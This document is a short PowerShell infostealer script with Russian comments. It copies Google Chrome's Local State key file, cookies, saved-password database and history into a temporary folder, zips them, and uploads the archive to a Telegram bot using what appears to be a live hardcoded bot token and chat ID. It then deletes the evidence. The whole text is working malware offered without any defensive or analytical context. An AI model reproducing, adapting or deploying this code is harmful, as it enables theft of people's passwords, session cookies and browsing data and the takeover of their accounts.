$token = "8680192798:AAFdHwzr2HYwbGjz3gkaS5xlYjryAozMkGI"
$chatId = "1940923712"

$userData = "$env:LOCALAPPDATA\Google\Chrome\User Data"
$localState = "$userData\Local State"
# Пути к разным базам данных
$cookies = "$userData\Default\Network\Cookies"
$passwords = "$userData\Default\Login Data"
$history = "$userData\Default\History"

$destDir = "$env:TEMP\collect"
New-Item -ItemType Directory -Path $destDir -Force | Out-Null

try {
    # Собираем всё в одну папку
    Copy-Item $localState -Destination "$destDir\ls.json" -Force
    if (Test-Path $cookies) { Copy-Item $cookies -Destination "$destDir\cookies.db" -Force }
    if (Test-Path $passwords) { Copy-Item $passwords -Destination "$destDir\passwords.db" -Force }
    if (Test-Path $history) { Copy-Item $history -Destination "$destDir\history.db" -Force }

    # Архивируем
    $zipFile = "$env:TEMP\vault.zip"
    Compress-Archive -Path "$destDir\*" -DestinationPath $zipFile -Force
    
    # Отправляем
    & curl.exe -s -X POST "https://api.telegram.org/bot$token/sendDocument" -F "chat_id=$chatId" -F "document=@$zipFile"
    
    # Очистка
    Remove-Item $destDir -Recurse -Force
    Remove-Item $zipFile -Force
    
    Write-Host "Vault sent!"
} catch {
    & curl.exe -s -X POST "https://api.telegram.org/bot$token/sendMessage" -d "chat_id=$chatId" -d "text=Collection failed"
}
